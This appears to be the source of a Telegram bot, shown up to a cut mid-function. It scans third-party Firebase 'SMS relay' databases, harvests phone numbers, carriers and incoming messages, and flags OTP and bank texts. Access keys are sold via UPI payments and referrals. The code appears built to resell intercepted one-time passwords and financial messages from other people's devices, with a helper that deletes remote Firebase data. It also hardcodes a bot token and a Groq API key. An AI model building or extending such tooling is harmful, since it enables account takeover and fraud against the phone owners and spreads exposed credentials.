# ╔══════════════════════════════════════════════════════════════╗
#   OFFICE SMS RELAY MONITOR — v6 FINAL
#   Features: SSE Streaming · Groq AI · Firebase Health · Hot Numbers
#             Global Radar · Ghost Queue · Watchlist · User Mgmt
#             Pattern Confidence · Action Logs · Lifetime Keys
#             Groq AI Config via Telegram · No Flask / No HTML panel
# ╚══════════════════════════════════════════════════════════════╝

import os as _os
BOT_TOKEN       = "8965846336:AAHLR7JDW_g9HO2iVi0qv-bvuxQWXxgEC8k"
ADMIN_IDS       = [8837925145]
KEY_PREFIX      = "RELAY-"
KEY_LENGTH      = 30
RESYNC_INTERVAL = 600    # seconds (10 min)
PAGE_SIZE       = 15     # numbers per page
MAX_FB_SOURCES  = 1000    # hard limit on Firebase sources

GROQ_BASE_URL   = "https://api.groq.com/openai/v1"
ANTHROPIC_BASE  = "https://api.anthropic.com/v1"

# ── Runtime state ────────────────────────────────────────────────────────────
_pending_ai_hot: dict  = {}  # {num_id: {number, confidence, reason, …}}
_alerts_paused:  bool  = False  # Admin can pause all push alerts
_bot_locked:     bool  = False  # Admin can lock bot for all users
GROQ_MODELS     = {
    "fast": "llama-3.3-70b-versatile",
    "deep": "deepseek-r1-distill-llama-70b",
}
import re, asyncio, logging, sqlite3, sys, subprocess, secrets, string, json, hashlib
from datetime import datetime, timedelta
import fb_parser
import sms_receiver   # applies all 4 fixes to fb_parser at runtime
# ── Indian Standard Time (UTC+5:30) ────────────────────────────────────────
_IST = timedelta(hours=5, minutes=30)

def _now_ist() -> datetime:
    """Current datetime in IST (UTC+5:30). Use for ALL user-facing display."""
    return datetime.utcnow() + _IST

def _install(p):
    subprocess.check_call([sys.executable, "-m", "pip", "install", p, "-q"])

try: import aiohttp
except ImportError: _install("aiohttp"); import aiohttp

try: from aiogram import Bot, Dispatcher, F, Router
except ImportError: _install("aiogram==3.7.0"); from aiogram import Bot, Dispatcher, F, Router

from aiogram.client.default import DefaultBotProperties
from aiogram.types import (Message, CallbackQuery,
                           InlineKeyboardMarkup, InlineKeyboardButton,
                           ErrorEvent)
from aiogram.filters import CommandStart, Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.exceptions import TelegramBadRequest
import guard   # must be after aiogram imports so guard can import aiogram inside its functions

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)

bot    = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp     = Dispatcher(storage=MemoryStorage())
router = Router()


# ══════════════════════════════════════════════════════════════
# KEY GENERATOR
# ══════════════════════════════════════════════════════════════

def gen_key():
    ch = string.ascii_uppercase + string.digits
    return KEY_PREFIX + ''.join(secrets.choice(ch) for _ in range(KEY_LENGTH - len(KEY_PREFIX)))


# ══════════════════════════════════════════════════════════════
# DATABASE
# ══════════════════════════════════════════════════════════════

class DB:
    path = "office_relay.db"

    def cx(self):
        c = sqlite3.connect(self.path)
        c.row_factory = lambda cursor, row: {
            col[0]: row[idx] for idx, col in enumerate(cursor.description)
        }
        return c

    def init(self):
        with self.cx() as c:
            c.executescript("""
                CREATE TABLE IF NOT EXISTS users(
                    user_id INTEGER PRIMARY KEY, username TEXT,
                    refer_count INTEGER DEFAULT 0, is_banned INTEGER DEFAULT 0,
                    access_key TEXT DEFAULT NULL, is_unlocked INTEGER DEFAULT 0,
                    key_expiry_at TEXT DEFAULT NULL,
                    key_expired_at TEXT DEFAULT NULL);

                CREATE TABLE IF NOT EXISTS refer_log(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    referrer_id INTEGER, referred_id INTEGER, at TEXT);

                CREATE TABLE IF NOT EXISTS refer_fix_requests(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER UNIQUE,
                    username TEXT,
                    requested_at TEXT,
                    status TEXT DEFAULT 'pending');

                CREATE TABLE IF NOT EXISTS access_keys(
                    key TEXT PRIMARY KEY, owner_id INTEGER,
                    created_at TEXT, used_by INTEGER DEFAULT NULL,
                    is_lifetime INTEGER DEFAULT 0, revoked INTEGER DEFAULT 0,
                    expiry_minutes INTEGER DEFAULT NULL);

                CREATE TABLE IF NOT EXISTS numbers(
                    id INTEGER PRIMARY KEY AUTOINCREMENT, number TEXT UNIQUE,
                    device_id TEXT, device_name TEXT, sim_slot TEXT DEFAULT 'sim1',
                    carrier TEXT, status TEXT DEFAULT 'Active',
                    assigned_to INTEGER DEFAULT NULL, fb_source TEXT DEFAULT NULL,
                    sms_path TEXT DEFAULT NULL, status_path TEXT DEFAULT NULL,
                    struct_type TEXT DEFAULT NULL,
                    is_ghost INTEGER DEFAULT 0,
                    last_seen_ts INTEGER DEFAULT NULL,
                    last_sms_ts INTEGER DEFAULT NULL,
                    hot_score INTEGER DEFAULT 0,
                    offline_since INTEGER DEFAULT NULL);

                CREATE TABLE IF NOT EXISTS firebase_sources(
                    id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT UNIQUE,
                    label TEXT, added_at TEXT, last_synced TEXT,
                    num_count INTEGER DEFAULT 0, struct_type TEXT DEFAULT NULL,
                    api_key TEXT DEFAULT NULL,
                    health_level TEXT DEFAULT 'Excellent',
                    fail_count INTEGER DEFAULT 0,
                    parse_failures INTEGER DEFAULT 0,
                    timeout_count INTEGER DEFAULT 0,
                    empty_syncs INTEGER DEFAULT 0,
                    quarantined INTEGER DEFAULT 0,
                    quarantine_reason TEXT DEFAULT NULL,
                    last_health_check TEXT DEFAULT NULL);

                CREATE TABLE IF NOT EXISTS channels(
                    channel_id TEXT PRIMARY KEY, channel_link TEXT);

                CREATE TABLE IF NOT EXISTS settings(key TEXT PRIMARY KEY, value TEXT);

                CREATE TABLE IF NOT EXISTS sms_log(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    number TEXT, sender TEXT, otp TEXT,
                    full_msg TEXT, received_at TEXT,
                    fb_source TEXT DEFAULT NULL,
                    sms_category TEXT DEFAULT 'Other');

                CREATE TABLE IF NOT EXISTS watchlist(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    number TEXT UNIQUE, added_by INTEGER,
                    added_at TEXT, note TEXT DEFAULT NULL);

                CREATE TABLE IF NOT EXISTS action_logs(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    admin_id INTEGER, action TEXT,
                    detail TEXT, at TEXT);

                CREATE TABLE IF NOT EXISTS pattern_stats(
                    pattern TEXT PRIMARY KEY,
                    success INTEGER DEFAULT 0,
                    failure INTEGER DEFAULT 0,
                    last_used TEXT,
                    disabled INTEGER DEFAULT 0);

                CREATE TABLE IF NOT EXISTS ghost_queue(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    number_id INTEGER UNIQUE,
                    category TEXT DEFAULT 'Recoverable',
                    last_probed TEXT, probe_count INTEGER DEFAULT 0);

                CREATE TABLE IF NOT EXISTS referral_audit(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    referrer_id INTEGER, referred_id INTEGER,
                    status TEXT DEFAULT 'Valid', at TEXT);

                CREATE TABLE IF NOT EXISTS user_suspension(
                    user_id INTEGER PRIMARY KEY,
                    suspended_by INTEGER, reason TEXT, at TEXT);

                CREATE TABLE IF NOT EXISTS sms_dedup(
                    fingerprint TEXT PRIMARY KEY, seen_at TEXT);

                CREATE TABLE IF NOT EXISTS paid_payments(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    username TEXT,
                    txn_id TEXT UNIQUE,
                    amount TEXT,
                    upi_id TEXT,
                    utr_id TEXT DEFAULT NULL,
                    screenshot_file_id TEXT DEFAULT NULL,
                    status TEXT DEFAULT 'pending',
                    submitted_at TEXT,
                    reviewed_at TEXT DEFAULT NULL,
                    admin_note TEXT DEFAULT NULL,
                    key_issued TEXT DEFAULT NULL);

                CREATE TABLE IF NOT EXISTS ai_pending(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    num_id INTEGER UNIQUE,
                    number TEXT,
                    confidence INTEGER DEFAULT 0,
                    reason TEXT,
                    suggested_at TEXT,
                    source TEXT DEFAULT 'ai_hot',
                    status TEXT DEFAULT 'pending');

                CREATE TABLE IF NOT EXISTS number_reports(
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    number_id INTEGER,
                    reported_by INTEGER,
                    reported_at TEXT,
                    UNIQUE(number_id, reported_by));
            """)

            # Non-breaking column additions (safe to re-run)
            for col in [
                "ALTER TABLE numbers ADD COLUMN sms_path TEXT DEFAULT NULL",
                "ALTER TABLE numbers ADD COLUMN status_path TEXT DEFAULT NULL",
                "ALTER TABLE numbers ADD COLUMN struct_type TEXT DEFAULT NULL",
                "ALTER TABLE numbers ADD COLUMN is_ghost INTEGER DEFAULT 0",
                "ALTER TABLE numbers ADD COLUMN last_seen_ts INTEGER DEFAULT NULL",
                "ALTER TABLE numbers ADD COLUMN last_sms_ts INTEGER DEFAULT NULL",
                "ALTER TABLE numbers ADD COLUMN hot_score INTEGER DEFAULT 0",
                "ALTER TABLE numbers ADD COLUMN offline_since INTEGER DEFAULT NULL",
                "ALTER TABLE numbers ADD COLUMN assigned_at INTEGER DEFAULT NULL",
                "ALTER TABLE firebase_sources ADD COLUMN struct_type TEXT DEFAULT NULL",
                "ALTER TABLE firebase_sources ADD COLUMN api_key TEXT DEFAULT NULL",
                "ALTER TABLE firebase_sources ADD COLUMN health_level TEXT DEFAULT 'Excellent'",
                "ALTER TABLE firebase_sources ADD COLUMN fail_count INTEGER DEFAULT 0",
                "ALTER TABLE firebase_sources ADD COLUMN parse_failures INTEGER DEFAULT 0",
                "ALTER TABLE firebase_sources ADD COLUMN timeout_count INTEGER DEFAULT 0",
                "ALTER TABLE firebase_sources ADD COLUMN empty_syncs INTEGER DEFAULT 0",
                "ALTER TABLE firebase_sources ADD COLUMN quarantined INTEGER DEFAULT 0",
                "ALTER TABLE firebase_sources ADD COLUMN quarantine_reason TEXT DEFAULT NULL",
                "ALTER TABLE firebase_sources ADD COLUMN last_health_check TEXT DEFAULT NULL",
                "ALTER TABLE access_keys ADD COLUMN is_lifetime INTEGER DEFAULT 0",
                "ALTER TABLE access_keys ADD COLUMN revoked INTEGER DEFAULT 0",
                "ALTER TABLE access_keys ADD COLUMN expiry_minutes INTEGER DEFAULT NULL",
                "ALTER TABLE access_keys ADD COLUMN source TEXT DEFAULT 'admin'",
                "ALTER TABLE users ADD COLUMN key_expiry_at TEXT DEFAULT NULL",
                "ALTER TABLE users ADD COLUMN key_expired_at TEXT DEFAULT NULL",
                "ALTER TABLE sms_log ADD COLUMN fb_source TEXT DEFAULT NULL",
                "ALTER TABLE sms_log ADD COLUMN sms_category TEXT DEFAULT 'Other'",
                "ALTER TABLE refer_log ADD COLUMN at TEXT",
                "ALTER TABLE numbers ADD COLUMN report_count INTEGER DEFAULT 0",
            ]:
                try: c.execute(col)
                except Exception: pass

            # Default settings
            defaults = [
                ("refer_limit", "1"),
                ("key_mode", "1"),
                ("refer_key_type", "perm"),
                ("refer_key_duration", "1440"),
                ("paid_key_upi", ""),
                ("paid_key_amount", "99"),
                ("paid_key_qr_file_id", ""),
                ("paid_key_type", "perm"),
                ("paid_key_duration", "1440"),
                ("paid_key_enabled", "0"),
                ("groq_api_key", "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"),
                ("groq_model", "fast"),
                ("anthropic_api_key", ""),
                ("watchdog_stale_secs", "45"),
                ("quarantine_threshold", "5"),
                ("ghost_probe_interval", "1800"),
            ]
            for k, v in defaults:
                if not c.execute("SELECT 1 FROM settings WHERE key=?", (k,)).fetchone():
                    c.execute("INSERT INTO settings VALUES(?,?)", (k, v))

    # ── User registration ──────────────────────────────────────
    def reg_user(self, uid, uname, ref_id=None):
        with self.cx() as c:
            u = c.execute("SELECT * FROM users WHERE user_id=?", (uid,)).fetchone()
            if not u:
                c.execute("INSERT INTO users(user_id,username) VALUES(?,?)", (uid, uname))
                if ref_id and ref_id != uid:
                    if not c.execute("SELECT 1 FROM refer_log WHERE referred_id=?", (uid,)).fetchone():
                        now = _now_ist().strftime("%d-%m-%Y %H:%M")
                        c.execute("INSERT INTO refer_log VALUES(NULL,?,?,?)", (ref_id, uid, now))
                        c.execute("INSERT OR IGNORE INTO referral_audit(referrer_id,referred_id,status,at) VALUES(?,?,?,?)",
                                  (ref_id, uid, "Valid", now))
                        c.execute("UPDATE users SET refer_count=refer_count+1 WHERE user_id=?", (ref_id,))
                        ref   = c.execute("SELECT * FROM users WHERE user_id=?", (ref_id,)).fetchone()
                        limit = int(self.get("refer_limit") or 1)
                        if ref and ref["refer_count"] + 1 >= limit and not ref["access_key"]:
                            nk = gen_key()
                            rkt = self.get("refer_key_type") or "perm"
                            dur = int(self.get("refer_key_duration") or 1440) if rkt == "temp" else None
                            is_lt = 1 if rkt == "perm" else 0
                            # Set is_unlocked=1 directly — referrer unlocked without manual key entry
                            if rkt == "temp" and dur:
                                expiry_dt  = _now_ist() + timedelta(minutes=dur)
                                expiry_str = expiry_dt.strftime("%d-%m-%Y %H:%M:%S")
                                c.execute(
                                    "UPDATE users SET access_key=?, is_unlocked=1, "
                                    "key_expiry_at=?, key_expired_at=NULL WHERE user_id=?",
                                    (nk, expiry_str, ref_id))
                            else:
                                c.execute(
                                    "UPDATE users SET access_key=?, is_unlocked=1, "
                                    "key_expiry_at=NULL, key_expired_at=NULL WHERE user_id=?",
                                    (nk, ref_id))
                            c.execute("INSERT INTO access_keys(key,owner_id,created_at,used_by,is_lifetime,revoked,expiry_minutes,source) VALUES(?,?,?,NULL,?,0,?,?)",
                                      (nk, ref_id, now, is_lt, dur, "refer"))
                            return {"is_banned": 0, "notify_ref": ref_id, "new_key": nk,
                                    "key_type": rkt, "dur_mins": dur}
                return {"is_banned": 0}
            return dict(u)

    def get(self, key):
        r = self.cx().execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        return r["value"] if r else None

    def set(self, key, val):
        with self.cx() as c:
            c.execute("INSERT OR REPLACE INTO settings VALUES(?,?)", (key, str(val)))

    def unlocked(self, uid):
        if uid in ADMIN_IDS: return True
        # Check suspension
        if self.cx().execute("SELECT 1 FROM user_suspension WHERE user_id=?", (uid,)).fetchone():
            return False
        u = self.cx().execute("SELECT is_unlocked, key_expiry_at FROM users WHERE user_id=?", (uid,)).fetchone()
        if not u: return False
        if not int(self.get("key_mode") or 1): return True
        if not u["is_unlocked"]: return False
        # Check temporary key expiry
        if u["key_expiry_at"]:
            try:
                expiry = datetime.strptime(u["key_expiry_at"], "%d-%m-%Y %H:%M:%S")
                if _now_ist() > expiry:
                    now_str = _now_ist().strftime("%d-%m-%Y %H:%M:%S")
                    with self.cx() as c:
                        c.execute("UPDATE users SET is_unlocked=0, key_expiry_at=NULL, access_key=NULL, key_expired_at=? WHERE user_id=?",
                                  (now_str, uid))
                    return False
            except Exception:
                pass
        return True

    def log_action(self, admin_id, action, detail=""):
        with self.cx() as c:
            c.execute("INSERT INTO action_logs(admin_id,action,detail,at) VALUES(?,?,?,?)",
                      (admin_id, action, detail[:500], _now_ist().strftime("%d-%m-%Y %H:%M")))


db = DB()
db.init()


# ══════════════════════════════════════════════════════════════
# RUNTIME STATE
# ══════════════════════════════════════════════════════════════

active_sessions:   dict[int, bool]           = {}
last_sms_seen:     dict[str, str]            = {}
sse_tasks:         dict[int, asyncio.Task]   = {}
sse_last_event:    dict[str, float]          = {}   # device_id → epoch float
radar_cache:       list                      = []   # recent global radar entries

# Cap concurrent SSE connections so a large DB (1000 + numbers) doesn't
# saturate the event loop with thousands of simultaneous HTTP connections.
# 150 = ~50 numbers × 3 fan-out paths each → good balance for any VPS.
_SSE_SEM = asyncio.Semaphore(150)


# ══════════════════════════════════════════════════════════════
# FIREBASE HTTP HELPERS
# ══════════════════════════════════════════════════════════════

async def fb_ping(sess, base_url, api_key=None, timeout=8):
    base = base_url.replace(".json", "").rstrip("/")
    url  = f"{base}/.json?shallow=true"
    if api_key: url += f"&auth={api_key}"
    try:
        async with sess.get(url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            await r.content.read(2048)
            return r.status, None
    except Exception as e:
        return 0, str(e)


async def fb_get(sess, url, timeout=15, api_key=None):
    u = url.split("?")[0]
    q = ("?" + url.split("?")[1]) if "?" in url else ""
    if not u.endswith(".json"):
        u = u.rstrip("/") + ".json"
    if api_key:
        sep = "&" if q else "?"
        q   = (q or "?") + sep.replace("?", "") + f"auth={api_key}"
        if not q.startswith("?"): q = "?" + q
    try:
        async with sess.get(u + q, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status == 200: return await r.json(content_type=None)
            log.warning("Firebase HTTP %d → %s", r.status, u)
            return None
    except Exception as e:
        log.warning("Firebase error %s: %s", u, e)
        return None


async def fb_delete(sess, url, api_key=None, timeout=10):
    u = url.rstrip("/")
    if not u.endswith(".json"): u += ".json"
    if api_key: u += f"?auth={api_key}"
    try:
        async with sess.delete(u, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            return r.status in (200, 204)
    except Exception as e:
        log.warning("Firebase delete error %s: %s", u, e)
        return False


def _get_fb_apikey(fb_source):
    if not fb_source: return None
    base = fb_source.replace(".json", "").rstrip("/")
    row  = db.cx().execute("SELECT api_key FROM firebase_sources WHERE url=?", (base,)).fetchone()
    return row["api_key"] if row and row["api_key"] else None


_GROQ_KEY_FALLBACK = "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"

def _get_groq_key():
    return db.get("groq_api_key") or _GROQ_KEY_FALLBACK

def _get_groq_model():
    slug = db.get("groq_model") or "fast"
    return GROQ_MODELS.get(slug, GROQ_MODELS["fast"])

def _get_anthropic_key():
    return db.get("anthropic_api_key") or ""


# ══════════════════════════════════════════════════════════════
# SMS HELPERS
# ══════════════════════════════════════════════════════════════

_FB_SYSTEM_KEYS = frozenset({
    "fcmDelivery","fcm","fcm_tokens","fcmTokens","firebase-messaging",
    "notifications","analytics","remoteConfig","remote_config",
    "crashlytics","performance","__fbfiles__","__storage__",
    "appCheck","hosting","rules","indexes","functions",
    "firestore","auth","identitytoolkit","securetoken",
})

_PH_FIELDS = (
    "phoneNumber","phone_number","phone","number","mobile",
    "mobile_number","sim1","sim2","sim1Number","sim2Number",
    "SIM1","SIM2","simNumber","simPhone","subscriberNumber",
    "mobileNumber","contactNumber","telNumber",
)
_CARRIER_FIELDS = (
    "operator","network","carrier","simOperator","networkOperator",
    "telephonyNetworkOperator","carrierName","serviceProvider",
    "networkName","operatorName",
    # Additional field names seen in real Firebase SMS relay apps:
    "sim1Operator","sim2Operator","sim1Provider","sim2Provider",
    "simProvider","simCarrier","networkProvider","telecomOperator",
    "sim1Network","sim2Network","simName","networkType","mobileNetwork",
    "carrierCode","mcc","mnc","operatorNumeric","networkInfo",
    "sim1","sim2","Sim1","Sim2","SIM1","SIM2",
)
_PH_RE = re.compile(r'^(\+?91)?[6-9]\d{9}$|^\+\d{7,15}$')


def _norm_phone(raw):
    d = re.sub(r'[^\d]', '', str(raw))
    if len(d) < 7: return None
    if len(d) == 10 and d[0] in "6789": return "+91" + d
    if len(d) == 12 and d.startswith("91"): return "+" + d
    return "+" + d if not str(raw).startswith("+") else str(raw).strip()


def _status_str(v):
    return "Inactive" if str(v).strip().lower() in ("offline","0","false","inactive") else "Active"


def _extract_last_seen_ts(node):
    if not isinstance(node, dict): return None
    for f in ("lastSeen","last_seen","lastActive","last_active",
              "timestamp","backupTime","lastSync","last_sync",
              "lastOnline","updatedAt","updated_at","lastBackup","time"):
        v = node.get(f)
        if v is None: continue
        s = str(v).strip()
        if s.isdigit():
            ts = int(s)
            if ts > 1_000_000_000_000: ts //= 1000
            if 1_000_000_000 < ts < 9_000_000_000: return ts
    return None


def _status_from_node(node):
    if not isinstance(node, dict): return "Active"
    for sf in ("status","Status","online","isOnline","Online","active","Active","isActive"):
        v = node.get(sf)
        if v is None: continue
        s = str(v).strip().lower()
        if s in ("offline","0","false","inactive","no","disconnected"): return "Inactive"
        if s in ("online","1","true","active","yes","connected"):       return "Active"
    ts = _extract_last_seen_ts(node)
    if ts is not None:
        age_h = (datetime.now().timestamp() - ts) / 3600
        if age_h > 48: return "Inactive"
        if age_h <= 2: return "Active"
    return "Active"


def _carrier(raw):
    s = str(raw)
    return s.split(" - ")[-1].strip() if " - " in s else ""


def _parse_time(entry):
    # Cover every field name seen across Firebase app variants
    for f in ("timestamp","backupTime","date","datetime","dateTime","time",
              "receivedAt","received_at","sentAt","sentTime","created_at","createdAt"):
        ts = entry.get(f)
        if ts is None: continue
        s = str(ts).strip()
        if s.isdigit() and len(s) > 10:           # epoch ms → IST
            try: return (datetime.utcfromtimestamp(int(s) / 1000) + _IST).strftime("%d-%m-%Y %H:%M:%S")
            except: pass
        if s.isdigit() and len(s) <= 10:           # epoch s  → IST
            try: return (datetime.utcfromtimestamp(int(s)) + _IST).strftime("%d-%m-%Y %H:%M:%S")
            except: pass
        if not s.isdigit() and len(s) > 5: return s.replace(" | ", " ")
    return _now_ist().strftime("%d-%m-%Y %H:%M:%S")


def _parse_sms_time_ts(ts_str) -> int:
    """Convert a formatted SMS time string (as stored in sms_log) back to a Unix timestamp.
    Returns 0 if unparseable.  Handles:
      - Raw Unix millis  (13-digit int string)
      - Raw Unix seconds (≤10-digit int string)
      - 'DD-MM-YYYY HH:MM:SS'  (our canonical format from _parse_time)
      - 'YYYY-MM-DD HH:MM:SS', 'DD/MM/YYYY HH:MM:SS'
    """
    if not ts_str: return 0
    s = str(ts_str).strip()
    if s.isdigit():
        n = int(s)
        return n // 1000 if len(s) > 10 else n
    for fmt in ("%d-%m-%Y %H:%M:%S", "%Y-%m-%d %H:%M:%S",
                "%d/%m/%Y %H:%M:%S", "%m/%d/%Y %H:%M:%S",
                "%d/%m/%Y %I:%M %p", "%d-%m-%Y %I:%M %p",
                "%d/%m/%Y %I:%M:%S %p", "%d-%m-%Y %I:%M:%S %p"):
        try: return int(datetime.strptime(s, fmt).timestamp())
        except: pass
    return 0


def _norm_sms(entry):
    if not isinstance(entry, dict): return None, None, None
    msg    = (entry.get("body") or entry.get("message") or
              entry.get("msg")  or entry.get("text") or "")
    sender = (entry.get("sender") or entry.get("from") or
              entry.get("ph")     or entry.get("address") or "Unknown")
    return msg, str(sender), _parse_time(entry)


def _latest(node):
    if not isinstance(node, dict) or not node: return None, None
    def key_score(k):
        s = str(k)
        if s.lstrip("-").isdigit() and len(s.lstrip("-")) >= 5:
            return (1, int(s.lstrip("-")))
        parts = s.split("_")
        if len(parts) >= 3 and parts[-1].isdigit() and len(parts[-1]) >= 10:
            return (1, int(parts[-1]))
        return (0, s)
    try: best = max(node.keys(), key=key_score)
    except: best = list(node.keys())[-1]
    return node[best], str(best)


def _top_n(node, n=5):
    if not isinstance(node, dict) or not node: return []
    def key_score(k):
        s = str(k)
        if s.lstrip("-").isdigit() and len(s.lstrip("-")) >= 5:
            return (1, int(s.lstrip("-")))
        parts = s.split("_")
        if len(parts) >= 3 and parts[-1].isdigit() and len(parts[-1]) >= 10:
            return (1, int(parts[-1]))
        return (0, s)
    try: sorted_keys = sorted(node.keys(), key=key_score, reverse=True)[:n]
    except: sorted_keys = list(node.keys())[-n:]
    return [(node[k], str(k)) for k in sorted_keys if isinstance(node.get(k), dict)]


# ══════════════════════════════════════════════════════════════
# SMS DEDUPLICATION
# ══════════════════════════════════════════════════════════════

def _sms_fingerprint(number: str, sender: str, body: str, ts: str) -> str:
    raw = f"{number}|{sender}|{body[:60]}|{ts}"
    return hashlib.md5(raw.encode()).hexdigest()


def _is_duplicate(fp: str) -> bool:
    """Return True if this fingerprint was seen recently (<2 h). Also inserts if new."""
    with db.cx() as c:
        row = c.execute("SELECT seen_at FROM sms_dedup WHERE fingerprint=?", (fp,)).fetchone()
        if row:
            return True
        now = _now_ist().strftime("%d-%m-%Y %H:%M:%S")
        c.execute("INSERT OR IGNORE INTO sms_dedup(fingerprint,seen_at) VALUES(?,?)", (fp, now))
        # Purge entries older than 2 hours
        cutoff = (_now_ist() - timedelta(hours=2)).strftime("%d-%m-%Y %H:%M:%S")
        c.execute("DELETE FROM sms_dedup WHERE seen_at < ?", (cutoff,))
    return False


# ══════════════════════════════════════════════════════════════
# SMS CATEGORY DETECTOR
# ══════════════════════════════════════════════════════════════

def _sms_category(body: str) -> str:
    b = body.lower()
    if re.search(r'\b(otp|one.time|verification.code|\d{4,8}.*code|code.*\d{4,8})\b', b): return "OTP"
    if re.search(r'\b(flipkart|fk)\b', b):    return "Flipkart"
    if re.search(r'\b(amazon|amzn)\b', b):    return "Amazon"
    if re.search(r'\b(swiggy)\b', b):         return "Swiggy"
    if re.search(r'\b(zomato)\b', b):         return "Zomato"
    if re.search(r'\b(blinkit|grofers)\b', b): return "Blinkit"
    if re.search(r'\b(bank|hdfc|sbi|icici|axis|kotak|idfc|debit|credit|debited|credited|upi|imps|neft)\b', b): return "Bank"
    if re.search(r'\b(delivery|shipped|dispatch|courier|order)\b', b): return "Delivery"
    return "Other"


# ══════════════════════════════════════════════════════════════
# PHONE & CARRIER EXTRACTORS
# ══════════════════════════════════════════════════════════════

def _extract_phone_deep(node):
    if not isinstance(node, dict): return None
    for key in _PH_FIELDS:
        v = node.get(key)
        if v and isinstance(v, (str, int)):
            ph = _norm_phone(str(v).split(" - ")[0])
            if ph: return ph
    for nest_key in ("simInfo","sim_info","SimInfo","simINFO","SIMInfo",
                     "deviceInfo","device_info","info","Info"):
        sub = node.get(nest_key)
        if isinstance(sub, dict):
            for sk in _PH_FIELDS:
                v = sub.get(sk)
                if v:
                    ph = _norm_phone(str(v).split(" - ")[0])
                    if ph: return ph
    return None


def _extract_carrier_deep(node):
    if not isinstance(node, dict): return ""
    _BAD = {"unknown","null","none","","n/a","na","0","not available","unavailable"}

    def _ok(v):
        if not v or not isinstance(v, str): return False
        return v.strip().lower() not in _BAD and len(v.strip()) > 1

    def _slot_carrier(v):
        """Extract carrier string from a sim-slot value (may be 'MCC - Carrier' format)."""
        if isinstance(v, str):
            if " - " in v:
                part = v.split(" - ")[-1].strip()
                if _ok(part): return part[:40]
            if _ok(v): return str(v).strip()[:40]
        return ""

    # Direct named carrier fields first (single-SIM or primary)
    primary = ""
    for key in _CARRIER_FIELDS:
        v = node.get(key)
        if _ok(v): primary = str(v).strip()[:40]; break

    # Collect both SIM slot carriers — FIX: previously returned on first slot found,
    # now we gather sim1 + sim2 and return them combined for dual-SIM devices (e.g. Jio / Airtel).
    sim_carriers = []
    for slot in ("sim1","SIM1","Sim1"):
        c = _slot_carrier(node.get(slot))
        if c and c not in sim_carriers:
            sim_carriers.append(c); break
    for slot in ("sim2","SIM2","Sim2"):
        c = _slot_carrier(node.get(slot))
        if c and c not in sim_carriers:
            sim_carriers.append(c); break

    if len(sim_carriers) >= 2:
        return " / ".join(sim_carriers[:2])
    if sim_carriers:
        return sim_carriers[0]
    if primary:
        return primary

    # Nested objects: simInfo, sim_info, SimInfo, simDetails, deviceInfo, etc.
    for nest in ("simInfo","sim_info","SimInfo","simDetails","sim_details",
                 "deviceInfo","device_info","DeviceInfo","info","Info"):
        sub = node.get(nest)
        if not isinstance(sub, dict): continue
        sub_primary = ""
        for key in _CARRIER_FIELDS:
            v = sub.get(key)
            if _ok(v): sub_primary = str(v).strip()[:40]; break
        sub_sims = []
        for slot in ("sim1","SIM1","Sim1"):
            c = _slot_carrier(sub.get(slot))
            if c and c not in sub_sims: sub_sims.append(c); break
        for slot in ("sim2","SIM2","Sim2"):
            c = _slot_carrier(sub.get(slot))
            if c and c not in sub_sims: sub_sims.append(c); break
        for slot in ("operator","carrier","network"):
            c = _slot_carrier(sub.get(slot))
            if c and c not in sub_sims: sub_sims.append(c); break
        if len(sub_sims) >= 2: return " / ".join(sub_sims[:2])
        if sub_sims: return sub_sims[0]
        if sub_primary: return sub_primary

    # Last resort: scan ALL string values for operator-like content
    for k, v in node.items():
        if isinstance(v, str) and _ok(v):
            kl = k.lower()
            if any(x in kl for x in ("carrier","operator","network","sim","provider","telecom")):
                return v.strip()[:40]
    return ""


def _is_strictly_alive(node: dict, max_hours: float = 24.0) -> bool:
    """
    Returns True ONLY if there is strong evidence the device is currently active.
    Does NOT return True just because the node exists — ghost devices keep their
    old Firebase nodes forever.
    Criteria (any one is enough):
      1. Explicit online status field = online/active/1/true
      2. Last-seen timestamp within max_hours
    Battery alone or node existence does NOT count.
    """
    if not isinstance(node, dict) or not node:
        return False
    # Criterion 1: explicit status field
    for sf in ("status","Status","online","isOnline","Online","active","Active","isActive"):
        v = node.get(sf)
        if v is None: continue
        s = str(v).strip().lower()
        if s in ("online","1","true","active","yes","connected"):
            return True
        if s in ("offline","0","false","inactive","no","disconnected"):
            return False  # explicitly offline → not alive
    # Criterion 2: recent timestamp
    ts = _extract_last_seen_ts(node)
    if ts is not None:
        age_h = (datetime.now().timestamp() - ts) / 3600
        if age_h <= max_hours:
            return True
    return False


def _latest_sms_ts(sms_node: dict) -> float | None:
    """
    Given an SMS node (dict of SMS entries), return the Unix timestamp of the
    most recent SMS, or None if no timestamp found.
    Used to check if SMS activity is RECENT, not just any SMS.

    Handles all observed field shapes:
      - Digit epoch-ms / epoch-s in standard timestamp fields
      - String datetime values such as "15-06-2026 | 02:48 PM" (tinmm88 style)
      - Integer "id" field that is itself an epoch-ms timestamp
      - Integer dict key that is itself an epoch-ms timestamp (tinmm88 key = epoch-ms)
    """
    if not isinstance(sms_node, dict): return None
    best = None
    for key, val in sms_node.items():
        if not isinstance(val, dict): continue
        ts = _extract_last_seen_ts(val)

        if ts is None:
            # 1) Standard digit-string epoch fields
            for tf in ("timestamp","backupTime","date","datetime","dateTime","time","id",
                       "receivedAt","received_at","sentAt","sentTime","created_at","createdAt"):
                raw = val.get(tf)
                if raw is None: continue
                s = str(raw).strip()
                if s.isdigit():
